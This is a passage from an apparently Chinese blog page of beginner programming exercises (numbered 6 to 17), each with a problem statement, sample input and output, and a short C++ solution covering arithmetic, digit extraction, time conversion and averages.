<h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure>

<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c, d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> result = (a + b - c) * d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-6-计算A乘B-1"><a href="#题目名称-6-计算A乘B-1" class="headerlink" title="题目名称:6-计算A乘B-1"></a>题目名称:6-计算A乘B-1</h2><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>输入两个正整数A和B，求A×B的值。</p>
<h2 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述"></a>输入描述</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，两个正整数，空隔隔开，分别表示A和B。（1 ≤ A, B ≤ 100）</span><br></pre></td></tr></table></figure>

<h2 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述"></a>输出描述</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，一个整数，表示A×B的值。               </span><br></pre></td></tr></table></figure>

<h2 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 4</span><br></pre></td></tr></table></figure>

<h2 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure>

<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> A, B;</span><br><span class="line">    <span class="comment">// 读取两个正整数</span></span><br><span class="line">    cin &gt;&gt; A &gt;&gt; B;</span><br><span class="line">    <span class="comment">// 计算乘积</span></span><br><span class="line">    <span class="type">int</span> result = A * B;</span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-7-计算A乘B-2"><a href="#题目名称-7-计算A乘B-2" class="headerlink" title="题目名称:7-计算A乘B-2"></a>题目名称:7-计算A乘B-2</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入两个正整数A和B，求A×B的值。</p>
<h3 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，两个正整数，空隔隔开，分别表示A和B。（1 ≤ A, B ≤ 50000）</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，一个整数，表示A×B的值。            </span><br></pre></td></tr></table></figure>

<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 4</span><br></pre></td></tr></table></figure>

<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure>

<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> A, B;</span><br><span class="line">    <span class="comment">// 读取两个正整数</span></span><br><span class="line">    cin &gt;&gt; A &gt;&gt; B;</span><br><span class="line">    <span class="comment">// 计算乘积</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result = <span class="built_in">static_cast</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(A) * B;</span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; result &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-8-字符输入输出"><a href="#题目名称-8-字符输入输出" class="headerlink" title="题目名称:8-字符输入输出"></a>题目名称:8-字符输入输出</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>rere想通过编程计算获得123的百位十位个位，请编程帮他实现，不能直接输出。</p>
<h3 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三行，第一行为百位，第二行为十位，第三行个位。</span><br></pre></td></tr></table></figure>

<h3 id="备注"><a href="#备注" class="headerlink" title="备注:"></a>备注:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请考虑你的方法一定要通用。</span><br></pre></td></tr></table></figure>

<h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">123</span>;</span><br><span class="line">    <span class="comment">// 计算百位、十位和个位</span></span><br><span class="line">    <span class="type">int</span> hundreds = (number / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> tens = (number / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> ones = number % <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 输出百位、十位和个位</span></span><br><span class="line">    cout &lt;&lt; hundreds &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; tens &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; ones &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-9-计算带余除法"><a href="#题目名称-9-计算带余除法" class="headerlink" title="题目名称:9-计算带余除法"></a>题目名称:9-计算带余除法</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定两个整数a和b (0 &lt; a,b &lt; 10,000)，计算a除以b的整数商和余数。</p>
<h3 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，包括两个整数a和b，依次为被除数和除数（不为零），中间用空格隔开。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，包含两个整数，依次为整数商和余数，中间用一个空格隔开。          </span><br></pre></td></tr></table></figure>

<h2 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15 2</span><br></pre></td></tr></table></figure>

<h2 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7 1</span><br></pre></td></tr></table></figure>

<h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 读取被除数和除数</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="comment">// 计算整数商和余数</span></span><br><span class="line">    <span class="type">int</span> quotient = a / b;</span><br><span class="line">    <span class="type">int</span> remainder = a % b;</span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; quotient &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; remainder &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-10-矩形的周长和面积"><a href="#题目名称-10-矩形的周长和面积" class="headerlink" title="题目名称:10-矩形的周长和面积"></a>题目名称:10-矩形的周长和面积</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入矩形的长和宽，计算其周长和面积。</p>
<h3 id="输入描述-9"><a href="#输入描述-9" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，输入矩形的长和宽（范围均为1~100)   ，空格分隔。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，两个整数，空格分隔，分别表示周长和面积。                  </span><br></pre></td></tr></table></figure>

<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 6</span><br></pre></td></tr></table></figure>

<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18 18</span><br></pre></td></tr></table></figure>

<h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> length, width;</span><br><span class="line">    <span class="comment">// 读取矩形的长和宽</span></span><br><span class="line">    cin &gt;&gt; length &gt;&gt; width;</span><br><span class="line">    <span class="comment">// 计算周长和面积</span></span><br><span class="line">    <span class="type">int</span> perimeter = <span class="number">2</span> * (length + width);</span><br><span class="line">    <span class="type">int</span> area = length * width;</span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; perimeter &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; area &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-11-长方体的表面积和体积"><a href="#题目名称-11-长方体的表面积和体积" class="headerlink" title="题目名称:11-长方体的表面积和体积"></a>题目名称:11-长方体的表面积和体积</h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入长方体的长宽高，输出其表面积和体积。</p>
<h3 id="输入描述-10"><a href="#输入描述-10" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，输入三个整数，空格分隔，分别表示长宽高，范围：1~1000000。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-10"><a href="#输出描述-10" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出两个整数，空格分隔，分别表示长方体的表面积和体积。                  </span><br></pre></td></tr></table></figure>

<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1000 1000 20000</span><br></pre></td></tr></table></figure>

<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">82000000 20000000000</span><br></pre></td></tr></table></figure>

<h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> length, width, height;</span><br><span class="line">    <span class="comment">// 读取长方体的长、宽和高</span></span><br><span class="line">    cin &gt;&gt; length &gt;&gt; width &gt;&gt; height;</span><br><span class="line">    <span class="comment">// 计算表面积和体积</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> surface_area = <span class="number">2</span> * (length * width + length * height + width * height);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> volume = length * width * height;</span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    cout &lt;&lt; surface_area &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; volume &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-12-你能活多少秒"><a href="#题目名称-12-你能活多少秒" class="headerlink" title="题目名称:12-你能活多少秒"></a>题目名称:12-你能活多少秒</h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><p>   问题：一年约有3.156×107s，要求输入您的年龄，显示该年龄合多少秒。 </p>
<h3 id="输入描述-11"><a href="#输入描述-11" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，包括一个整数age(0&lt;age&lt;=200)。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-11"><a href="#输出描述-11" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，包含一个整数，输出年龄对应的秒数。            </span><br></pre></td></tr></table></figure>

<h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20</span><br></pre></td></tr></table></figure>

<h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">631200000</span><br></pre></td></tr></table></figure>

<h3 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int age;</span><br><span class="line">    // 读取年龄</span><br><span class="line">    cin &gt;&gt; age;</span><br><span class="line">    // 计算秒数</span><br><span class="line">    long long seconds = static_cast&lt;long long&gt;(age) * 31560000;</span><br><span class="line">    // 输出结果</span><br><span class="line">    cout &lt;&lt; seconds &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-13-时间转换"><a href="#题目名称-13-时间转换" class="headerlink" title="题目名称:13-时间转换"></a>题目名称:13-时间转换</h2><h3 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h3><p>​	Kiki最近买了一款新式手表，这款手表有点不同，它只会显示一天内从午夜零时零分零秒(0:0:0)经过的秒数，请你帮他转换为我们熟悉的时间表示方式（即几时几分几秒，24小时进制）。</p>
<h3 id="输入描述-12"><a href="#输入描述-12" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个整数 (0≤t≤86399)，表示当天走过的秒数。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-12"><a href="#输出描述-12" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用时:分:秒的格式输出，当时分秒为1位数是前面会加0。                 </span><br></pre></td></tr></table></figure>

<h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3669</span><br></pre></td></tr></table></figure>

<h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01:01:09</span><br></pre></td></tr></table></figure>

<h3 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> seconds;</span><br><span class="line">    <span class="comment">// 读取秒数</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;seconds);</span><br><span class="line">    <span class="comment">// 计算时、分、秒</span></span><br><span class="line">    <span class="type">int</span> hours = seconds / <span class="number">3600</span>;</span><br><span class="line">    seconds %= <span class="number">3600</span>;</span><br><span class="line">    <span class="type">int</span> minutes = seconds / <span class="number">60</span>;</span><br><span class="line">    seconds %= <span class="number">60</span>;</span><br><span class="line">    <span class="comment">// 输出结果，确保时、分、秒都以两位数格式输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02d:%02d:%02d\n&quot;</span>, hours, minutes, seconds);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-14-浮点除法"><a href="#题目名称-14-浮点除法" class="headerlink" title="题目名称:14-浮点除法"></a>题目名称:14-浮点除法</h2><h3 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h3><p>  输入两个整数a, b, 输出a除以b的值，保留三位小数 </p>
<h3 id="输入描述-13"><a href="#输入描述-13" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入两个整数，在int范围内</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-13"><a href="#输出描述-13" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出一个浮点数，保留三位小数              </span><br></pre></td></tr></table></figure>

<h3 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 2</span><br></pre></td></tr></table></figure>

<h3 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.500</span><br></pre></td></tr></table></figure>

<h3 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 读取两个整数</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="comment">// 计算 a 除以 b 的浮点数值</span></span><br><span class="line">    <span class="type">double</span> result = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(a) / b;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留三位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="题目名称-15-计算分数的浮点数值"><a href="#题目名称-15-计算分数的浮点数值" class="headerlink" title="题目名称:15-计算分数的浮点数值"></a>题目名称:15-计算分数的浮点数值</h2><h3 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h3><p>两个整数 a 和 b 分别作为分子和分母，既分数 ab\frac{a}{b}ba，求它的浮点数值（保留小数点后 9位）</p>
<h3 id="输入描述-14"><a href="#输入描述-14" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入仅一行，包括两个整数 a 和 b（1≤a,b,≤1000）。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-14"><a href="#输出描述-14" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出也仅一行，分数ab\frac&#123;a&#125;&#123;b&#125;ba的浮点数值（保留小数点后 9 位）          </span><br></pre></td></tr></table></figure>

<h3 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 7</span><br></pre></td></tr></table></figure>

<h3 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.714285714</span><br></pre></td></tr></table></figure>

<h3 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 读取分子和分母</span></span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="comment">// 计算分数 a/b 的浮点数值</span></span><br><span class="line">    <span class="type">double</span> result = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(a) / b;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留九位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.9lf\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-16-总成绩和平均分计算"><a href="#题目名称-16-总成绩和平均分计算" class="headerlink" title="题目名称:16-总成绩和平均分计算"></a>题目名称:16-总成绩和平均分计算</h2><h3 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h3><p>依次输入一个学生的3科成绩，在屏幕上输出该学生的总成绩以及平均成绩。</p>
<h3 id="输入描述-15"><a href="#输入描述-15" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，3科成绩，成绩之间用一个空格隔开。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-15"><a href="#输出描述-15" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一行，总成绩和平均成绩（小数点后保留两位），用一个空格隔开。         </span><br></pre></td></tr></table></figure>

<h3 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">79.5 80.0 98.0</span><br></pre></td></tr></table></figure>

<h3 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">257.50 85.83</span><br></pre></td></tr></table></figure>

<h3 id="代码-15"><a href="#代码-15" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> score1, score2, score3;</span><br><span class="line">    <span class="comment">// 读取3科成绩</span></span><br><span class="line">    cin &gt;&gt; score1 &gt;&gt; score2 &gt;&gt; score3;</span><br><span class="line">    <span class="comment">// 计算总成绩和平均成绩</span></span><br><span class="line">    <span class="type">double</span> total_score = score1 + score2 + score3;</span><br><span class="line">    <span class="type">double</span> average_score = total_score / <span class="number">3.0</span>;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf %.2lf\n&quot;</span>, total_score, average_score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目名称-17-三科平均分"><a href="#题目名称-17-三科平均分" class="headerlink" title="题目名称:17-三科平均分"></a>题目名称:17-三科平均分</h2><h3 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知Kiki的语文、数学、英语课程的成绩，求他三门课程的平均分。</p>
<h3 id="输入描述-16"><a href="#输入描述-16" class="headerlink" title="输入描述"></a>输入描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入三个整数（范围0~100），数据之间由空格隔开。</span><br></pre></td></tr></table></figure>

<h3 id="输出描述-16"><a href="#输出描述-16" class="headerlink" title="输出描述"></a>输出描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出占一行，包含一个实数，为三门课的平均分，保留两位小数。                     </span><br></pre></td></tr></table></figure>

<h3 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">87 73 93</span><br></pre></td></tr></table></figure>

<h3 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">84.33</span><br></pre></td></tr></table></figure>

<h3 id="代码-16"><a href="#代码-16" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> chinese, math, english;</span><br><span class="line">    <span class="comment">// 读取语文、数学和英语成绩</span></span><br><span class="line">    cin &gt;&gt; chinese &gt;&gt; math &gt;&gt; english;</span><br><span class="line">    <span class="comment">// 计算平均分</span></span><br><span class="line">    <span class="type">double</span> average = <span class="built_in">static_cast</span>&lt;<span class="type">double</span>&gt;(chinese + math + english) / <span class="number">3.0</span>;</span><br><span class="line">    <span class="comment">// 设置输出格式，保留两位小数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>, average);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

